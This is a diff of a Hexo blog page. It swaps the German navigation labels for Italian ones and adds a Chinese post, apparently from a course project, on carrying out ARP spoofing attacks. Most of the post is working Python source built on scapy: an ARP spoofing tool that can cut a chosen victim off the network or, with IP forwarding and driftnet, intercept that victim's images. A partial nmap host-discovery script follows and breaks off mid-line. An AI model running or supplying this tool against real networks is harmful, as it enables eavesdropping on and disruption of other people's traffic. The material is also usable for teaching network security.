@@ -216,7 +216,7 @@
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Home</a>
 
   </li>
         
@@ -233,7 +233,7 @@
 
     
 
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>Über</a>
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>Informazioni su</a>
 
   </li>
         
@@ -267,7 +267,7 @@
 
     
 
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>Kategorien</a>
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>Categorie</a>
 
   </li>
         
@@ -284,7 +284,7 @@
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archivi</a>
 
   </li>
         
@@ -301,7 +301,7 @@
 
     
 
-    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br/>Schedule</a>
+    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br/>Programma</a>
 
   </li>
 
@@ -337,6 +337,324 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/09/08/ARP欺骗攻击实战/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh"/>
+      <meta itemprop="description" content=""/>
+      <meta itemprop="image" content="/images/avatar.gif"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/09/08/ARP欺骗攻击实战/" class="post-title-link" itemprop="url">ARP欺骗攻击实战</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Scritto il</span>
+              
+
+              
+                
+              
+
+              <time title="Post creato: 2019-09-08 21:13:06" itemprop="dateCreated datePublished" datetime="2019-09-08T21:13:06+08:00">2019-09-08</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Post modificato: 2019-09-19 18:26:44" itemprop="dateModified" datetime="2019-09-19T18:26:44+08:00">2019-09-19</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/vaeloverforever/article/details/84504876" target="_blank" rel="noopener">网络攻防实战–ARP欺骗</a><br>这篇对理解整个实验很有帮助，一步步跟着做就能完成不用代码的攻击。</p>
+<p><a href="https://blog.csdn.net/u014234504/article/details/81558397" target="_blank" rel="noopener">Python scapy实现一个简易arp攻击脚本</a></p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="用命令行传递参数：argparse"><a href="#用命令行传递参数：argparse" class="headerlink" title="用命令行传递参数：argparse"></a>用命令行传递参数：argparse</h2><p><a href="https://blog.csdn.net/tumi678/article/details/80507609" target="_blank" rel="noopener">https://blog.csdn.net/tumi678/article/details/80507609</a></p>
+<h2 id="程序暂停"><a href="#程序暂停" class="headerlink" title="程序暂停"></a>程序暂停</h2><p>如何让程序实现“按任意键继续这个功能？”<br><code>raw_input(&quot;按任意键继续&quot;)</code>  这个就可以简单实现<br><code>input(&quot;按任意键继续&quot;)</code>当然这个也可以，但是他要求输入整数，所以你如果输的不是整数，程序可能会出现报错。<br>所以这哪里是按任意键继续啊！</p>
+<p>字符的时候可以用raw_input()，当然不怕麻烦也可以用input()手动加’’<br>int类型的时候最好用input()<br><img src="/2019/09/08/ARP欺骗攻击实战/input.GIF" alt=""><br>搞了好一会才知道为啥报错，所以还是用raw_input()比较舒服，回车就ok了。</p>
+<h1>具体程序分析在我的课设word中，这里只写一部分</h1>
+
+<h1 id="代码思路"><a href="#代码思路" class="headerlink" title="代码思路"></a>代码思路</h1><p>4   代码<br>4.1 代码思路<br>4.1.1   如何发包<br>利用scapy模块构造应答包，来攻击目标主机。为进一步扩展程序，可以写一段代码，在攻击前扫描局域网内所以存活的主机，来确定攻击对象。<br>4.1.2   如何实现抓图嗅探功能<br>可以使用subprocess模块来调用别的程序，完成抓图嗅探功能。<br>4.1.3   如何设计图形化界面<br>可以使用一个简单的模块easygui。同时使用图形化界面也能完成传参，接收用户输入的攻击对象ip地址等信息。也能通过这个图形化界面来提示一些攻击信息。<br>4.1.4   打包程序后，没有终端交互，如何终止程序<br>使用subprocess模块，同时运行一个终端窗口，等待用户操作，并且创建一个flag文件，用于标记用户是否点击“终止”。<br>4.2 主程序代码<br>4.2.1   导入模块部分代码</p>
+<p>如图导入了一下需要的模块：<br>4.2.1.1 sys<br>sys用来防止遇到中文时发生的错误。<br>4.2.1.2 easygui<br>这个是用来完成图形化界面的一个模块。比较简单。<br>4.2.1.3 argparse<br>用于解析命令行参数和选项的标准模块。<br>但实际上，我们的参数后面已经改成用easygui模块的图形化界面来进行传递。<br>4.2.1.4 threading<br>threading模块是Python里面常用的线程模块，多线程处理任务对于提升效率非常重要。<br>threading 模块中最核心的内容是Thread这个类。<br>我们在后面也是使用这个模块多多线程发包的。<br>4.2.1.5 time<br>time模块是python专门用来处理时间的内建库。这个模块非常常用。<br>4.2.1.6 subprocess<br>允许使用者创建一个新的进程让其执行另外的程序，并与它进行通信，获取标准的输入、标准输出、标准错误以及返回码等。<br>我们就是使用这个模块达到执行其他程序的目的。<br>4.2.1.7 os<br>os模块提供了多数操作系统的功能接口函数。当os模块被导入后，它会自适应于不同的操作系统平台，根据不同的平台进行相应的操作，在python编程时，经常和文件、目录打交道，所以离不了os模块。python编程时，经常和文件、目录打交道，这是就离不了os模块，本节内容将对os模块提供的函数进行详细的解读。<br>我们就是利用这个模块，操作文件。<br>4.2.1.8 scapy<br>scapy是一个可以让用户发送、侦听和解析并伪装网络报文的Python程序。这些功能可以用于制作侦测、扫描和攻击网络的工具。<br>换言之，Scapy 是一个强大的操纵报文的交互程序。它可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。Scapy 可以轻松地做到像扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)这样的传统任务。它可以代替hping,arpspoof,arp-sk,arping,p0f 甚至是部分的Namp,tcpdump和tshark的功能。<br>这个模块可以说是ARP欺骗的精髓。利用这个模块实现发送响应报文。<br>如：<br>Ether用来构建以太网数据包<br>ARP是构建ARP数据包的类<br>sendp方法在第二层发送数据包<br>getmacbyip方法用于通过ip获取mac地址<br>get_if_hwaddr方法获取指定网卡的mac地址<br>4.2.2   函数定义部分</p>
+<p>4.2.2.1 get_mac(tgt_ip):<br>get_mac(tgt_ip):<br>调用scapy的getmacbyip函数，获取攻击目标IP的MAC地址。<br>4.2.2.2 create_arp_station与create_arp_gateway<br>create_arp_station（伪造计算机）和create_arp_gateway （伪造网关） ：<br>生成ARP数据包，伪造目标计算机欺骗网关<br>    src_mac:本机的MAC地址，充当中间人<br>    gateway_mac:网关的MAC<br>    tgt_ip:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击<br>    gateway_ip:网关的IP<br>    op=is-at,表示ARP响应<br>4.2.3   部分图形化界面设计</p>
+<p>这里用到的是easygui模块。这里面有一系列函数，例如：enterbox用来实现文本输入的图形化界面；<br>ccbox用来实现选择界面。<br>通过这里的几个图形化界面来确定攻击的对象和方式。</p>
+<p>根据用户的操作，去实现不同的效果：<br>如果选择的是断网攻击，就将攻击主机的IP转发功能给关了。<br>这个功能是由ip_forward的值定的。如果是1就是开启IP转发；如果是0，就是关闭IP转发。<br>4.2.4   判断程序终止</p>
+<p>这里利用subprocess和open操作打开自己创建的flag文件来实现自定义程序终止：<br>subprocess打开一个自己写的结束窗口，由于是用subprocess.popen，这个窗口的运行是不会阻断主程序运行的。这个窗口运行的同时，主程序在不断发包，控制被攻击主机的ARP缓存表。当用户想停止的时候，点击结束窗口的“finish”按钮，结束程序会改变flag文件的值。while循环的判断语句是finish的值，程序在一开始会将flag置0；而在while循环里，每次都会进行对flag文件的比较，如果flag文件的值发生了改变，那就可以知道用户想停止程序了，此时就会将finish置1，达到退出循环结束程序的目的。<br>4.2.5   发包部分代码</p>
+<p>发包部分用到了threading多线程。通过多线程发包来不断攻击目标主机，控制目标主机的ARP缓存表。<br>每个Thread对象代表着一个线程，可以通过start()方法，开始运行。<br>target(): 由run()方法调用的可调用对象。<br>start()：启动线程<br>join(timeout=None): 阻塞线程，直到执行结束或超时<br>kwargs: 目标调用的关键字参数的字典<br>为了方便使用观察，调用time.sleep函数。<br>time sleep() 函数推迟调用线程的运行，可通过参数secs指秒数，表示进程挂起的时间。</p>
+<p>4.3 结束窗口代码</p>
+<p>这部分代码就是先前提到的结束窗口部分代码。当用户点击“finish”按钮时就会修改flag文件达到结束程序的目的。<br>4.4 扫描主机部分代码</p>
+<p>这是扫描主机部分的代码。<br>这里用到了netiface和nmap模块。<br>4.4.1   def get_gateways<br>def get_gateways()这个函数调用了netifaces模块的gateways方法。netifaces.gateways()能获取网关的IP地址，方便后面对整个网段的扫描。<br>4.4.2   def get_ip_lists(ip):<br>这个函数的作用就是创建一个列表。该列表保存网关所在网段的所有主机ip地址。<br>4.4.3   main<br>main函数是扫描程序的主函数。<br>在主函数中，先调用两个事先定义好的函数：获取网关ip及其所在网段的全部IP地址（ip_lists）。<br>ret = nmScan.scan(hosts=hosts, arguments=’-sP’)这是这个扫描程序的关键所在。它能对host进行扫描，查看其是否存活。其中，hosts可以是单个IP地址也可以是一整个网段。arguments就是运用什么方式扫描，-sn就是ping扫描。因为我们要扫描整个网段，所以令hosts等于整个网段了。<br>扫描完成后，ret[‘scan’]保存存活主机及其信息，它是字典形式的，如图</p>
+<p>之后用temp_ip_lists保存所有不存活主机。之后删除ip_lists中所有不存活的主机，此时ip_lists中只保存了存活的主机。然后利用ip_lists显示所有存活主机的IP地址。</p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="arp-py（主程序）"><a href="#arp-py（主程序）" class="headerlink" title="arp.py（主程序）"></a>arp.py（主程序）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ARP 攻击脚本</span></span><br><span class="line"><span class="string">对于局域网内通信，运行时，输入双向欺骗目标。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">对于局域网内目标和外部通信，运行时输入欺骗目标和网关地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在ARP欺骗的同时，开启路由转发，既可获取双方通信内容。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> a</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> ARP, Ether, get_if_hwaddr, sendp</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> getmacbyip</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 注意这里面的几个方法</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Ether用来构建以太网数据包</span></span><br><span class="line"><span class="comment"># ARP是构建ARP数据包的类</span></span><br><span class="line"><span class="comment"># sendp方法在第二层发送数据包</span></span><br><span class="line"><span class="comment"># getmacbyip方法用于通过ip获取mac地址</span></span><br><span class="line"><span class="comment"># get_if_hwaddr方法获取指定网卡的mac地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(tgt_ip)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    调用scapy的getmacbyip函数，获取攻击目标IP的MAC地址。</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    tgt_mac = getmacbyip(tgt_ip)</span><br><span class="line">    <span class="keyword">if</span> tgt_mac <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> tgt_mac</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"无法获取IP为：%s 主机的MAC地址，请检查目标IP是否存活"</span>%tgt_ip)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_arp_station</span><span class="params">(src_mac, tgt_mac, gateway_ip, tgt_ip)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    生成ARP数据包，伪造网关欺骗目标计算机</span></span><br><span class="line"><span class="string">    src_mac:本机的MAC地址，充当中间人</span></span><br><span class="line"><span class="string">    tgt_mac:目标计算机的MAC</span></span><br><span class="line"><span class="string">    gateway_ip:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击</span></span><br><span class="line"><span class="string">    tgt_ip:目标计算机的IP</span></span><br><span class="line"><span class="string">    op=is-at,表示ARP响应</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    eth = Ether(src=src_mac, dst=tgt_mac)</span><br><span class="line">    arp = ARP(hwsrc=src_mac, psrc=gateway_ip, hwdst=tgt_mac, pdst=tgt_ip, op=<span class="string">"is-at"</span>)</span><br><span class="line">    pkt = eth / arp</span><br><span class="line">    <span class="keyword">return</span> pkt</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_arp_gateway</span><span class="params">(src_mac, gateway_mac, tgt_ip, gateway_ip)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    生成ARP数据包，伪造目标计算机欺骗网关</span></span><br><span class="line"><span class="string">    src_mac:本机的MAC地址，充当中间人</span></span><br><span class="line"><span class="string">    gateway_mac:网关的MAC</span></span><br><span class="line"><span class="string">    tgt_ip:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击</span></span><br><span class="line"><span class="string">    gateway_ip:网关的IP</span></span><br><span class="line"><span class="string">    op=is-at,表示ARP响应</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    eth = Ether(src=src_mac, dst=gateway_mac)</span><br><span class="line">    arp = ARP(hwsrc=src_mac, psrc=tgt_ip, hwdst=gateway_mac, pdst=gateway_ip, op=<span class="string">"is-at"</span>)</span><br><span class="line">    pkt = eth / arp</span><br><span class="line">    <span class="keyword">return</span> pkt</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    主方法</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    os.system(<span class="string">r"echo 0 &gt; /root/桌面/ARP欺骗/flag.txt"</span>)</span><br><span class="line">    os.system(<span class="string">r"python /root/桌面/ARP欺骗/pingscanner.py"</span>)<span class="comment">#存活主机扫描</span></span><br><span class="line"></span><br><span class="line">    h_ip=a.enterbox(msg=<span class="string">'请输入目标主机ip'</span>, title=<span class="string">'ARP欺骗'</span>, default=<span class="string">' '</span>, strip=<span class="keyword">True</span>, image=<span class="keyword">None</span>, root=<span class="keyword">None</span>)</span><br><span class="line">    way = a.ccbox(msg=<span class="string">'选择攻击范围'</span>, title=<span class="string">'ARP欺骗'</span>, choices=(<span class="string">'局域网内攻击(破坏局域网内的主机通信)'</span>, <span class="string">'攻击网关（使目标不能上网）'</span>), image=<span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">if</span> way==<span class="number">1</span>:</span><br><span class="line">        g_ip=a.enterbox(msg=<span class="string">'请输入另一台主机'</span>, title=<span class="string">'ARP欺骗'</span>, default=<span class="string">' '</span>, strip=<span class="keyword">True</span>, image=<span class="keyword">None</span>, root=<span class="keyword">None</span>)</span><br><span class="line">        other=<span class="string">"另一台主机"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g_ip=a.enterbox(msg=<span class="string">'请输入目标网关'</span>, title=<span class="string">'ARP欺骗'</span>, default=<span class="string">' '</span>, strip=<span class="keyword">True</span>, image=<span class="keyword">None</span>, root=<span class="keyword">None</span>)</span><br><span class="line">        other=<span class="string">"网关"</span></span><br><span class="line"></span><br><span class="line">    method =a.ccbox(msg=<span class="string">'选择攻击方式 '</span>, title=<span class="string">'ARP欺骗'</span>, choices=(<span class="string">'ARP断网攻击'</span>, <span class="string">'ARP欺骗并截获图片'</span>), image=<span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    tgt_ip = h_ip</span><br><span class="line">    gateway_ip = g_ip</span><br><span class="line">    interface = <span class="string">"eth0"</span></span><br><span class="line">    <span class="keyword">if</span> method== <span class="number">1</span>:</span><br><span class="line">        res = os.system(<span class="string">r"echo 0 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = os.system(<span class="string">r'echo 1 &gt; /proc/sys/net/ipv4/ip_forward'</span>)</span><br><span class="line">        subprocess.Popen(<span class="string">'driftnet -i eth0'</span>,shell=<span class="keyword">True</span>)</span><br><span class="line">    <span class="comment">#srcmac = args.srcmac</span></span><br><span class="line">    <span class="comment">#targetmac = args.targetmac</span></span><br><span class="line">    <span class="comment">#gatewaymac = args.gatewaymac</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tgt_ip <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> gateway_ip <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> interface <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        print(parser.print_help())</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    tgt_mac = get_mac(tgt_ip)</span><br><span class="line">    gateway_mac = get_mac(gateway_ip)</span><br><span class="line">    src_mac = get_if_hwaddr(interface)</span><br><span class="line">    m=<span class="string">'本机MAC地址是：'</span>+ src_mac +<span class="string">'\n'</span></span><br><span class="line">    m+=<span class="string">"目标计算机IP地址是："</span> + tgt_ip +<span class="string">'\n'</span></span><br><span class="line">    m+=<span class="string">"目标计算机MAC地址是："</span> + tgt_mac+<span class="string">'\n'</span></span><br><span class="line">    m+= other+<span class="string">"IP地址是："</span> + gateway_ip+<span class="string">'\n'</span></span><br><span class="line">    m+= other+<span class="string">"MAC地址是："</span> + gateway_mac</span><br><span class="line">    a.msgbox(msg= m , title= <span class="string">'ARP欺骗'</span>, ok_button=<span class="string">'start'</span>, image=<span class="keyword">None</span>, root=<span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    pkt_station = create_arp_station(src_mac, tgt_mac, gateway_ip, tgt_ip)</span><br><span class="line">    pkt_gateway = create_arp_gateway(src_mac, gateway_mac, tgt_ip, gateway_ip)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果不展示发送情况的话下面的语句可以更加简便直接用sendp方法提供的功能循环发送即可，不需要多线程和死循环。</span></span><br><span class="line">    <span class="comment"># sendp(pkt_station, inter=1, loop=1)</span></span><br><span class="line">    <span class="comment"># sendp(pkt_gateway, inter=1, loop=1)</span></span><br><span class="line">    finish=<span class="number">0</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/root/桌面/ARP欺骗/flag.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        before=f.read()</span><br><span class="line"></span><br><span class="line">    subprocess.Popen(<span class="string">'python /root/桌面/ARP欺骗/end.py'</span>,shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##start</span></span><br><span class="line">    <span class="keyword">while</span> finish ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'/root/桌面/ARP欺骗/flag.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f: </span><br><span class="line">            after=f.read()  </span><br><span class="line">        <span class="keyword">if</span> after==before:</span><br><span class="line">            before=after </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            </span><br><span class="line">            finish=<span class="number">1</span>    </span><br><span class="line"></span><br><span class="line">        t = threading.Thread(</span><br><span class="line">            target=sendp,</span><br><span class="line">            args=(pkt_station,),</span><br><span class="line">            kwargs=&#123;<span class="string">'inter'</span>:<span class="number">1</span>, <span class="string">'iface'</span>:interface&#125;</span><br><span class="line">        )</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">        print(str(i) + <span class="string">" [*]向目标计算机发送一个ARP欺骗包"</span>)</span><br><span class="line"></span><br><span class="line">        s = threading.Thread(</span><br><span class="line">            target=sendp,</span><br><span class="line">            args=(pkt_gateway,),</span><br><span class="line">            kwargs=&#123;<span class="string">'inter'</span>:<span class="number">1</span>, <span class="string">'iface'</span>:interface&#125;</span><br><span class="line">        )</span><br><span class="line">        s.start()</span><br><span class="line">        s.join()</span><br><span class="line"></span><br><span class="line">        print(str(i) + <span class="string">" [*]向"</span>+other+<span class="string">"发送一个ARP欺骗包"</span>)</span><br><span class="line">        <span class="comment">#a.msgbox(msg= str(i) + " [*]向目标计算机发送一个ARP欺骗包"+str(i) + " [*]向"+other+"发送一个ARP欺骗包", title= '', ok_button='开始', image=None, root=None)</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> a</span><br><span class="line"><span class="keyword">import</span> netifaces,nmap</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gateways</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> netifaces.gateways()[<span class="string">'default'</span>][netifaces.AF_INET][<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip_lists</span><span class="params">(ip)</span>:</span></span><br><span class="line">    ip_lists = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        ip_lists.append(<span class="string">'&#123;&#125;&#123;&#125;'</span>.format(ip[:<span class="number">-1</span>], i))</span><br><span class="line">    <span class="keyword">return</span> ip_lists</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(ip=None)</span>:</span></span><br><span class="line">    s=<span class="string">'正在扫描局域网中存活的主机'</span></span><br><span class="line">    a.msgbox(msg=s, title= <span class="string">'ARP欺骗'</span>, ok_button=<span class="string">'continue'</span>, image=<span class="keyword">None</span>,root=<span class="keyword">None</span>)</span><br><span class="line">    m=<span class="string">'网络中的存活主机:：'</span></span><br><span class="line">    ip=get_gateways()</span><br><span class="line">    ip_lists=get_ip_lists(ip)</span><br><span class="line">    nmScan,temp_ip_lists,hosts = nmap.PortScanner(),[],ip[:<span class="number">-1</span>]+<span class="string">'0/24'</span></span><br><span class="line">    ret = nmScan.scan(hosts=hosts, arguments=<span class="string">'-sP'</span>)</span><br><span class="line">    print(<span class="string">'扫描时间：'</span>+ret[<span class="string">'nmap'</span>][<span class="string">'scanstats'</span>][<span class="string">'timestr'</span>]+<span class="string">'\n命令参数:'</span>+ret[<span class="string">'nmap'</span>][<span class="string">'command_line'</span>])</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> 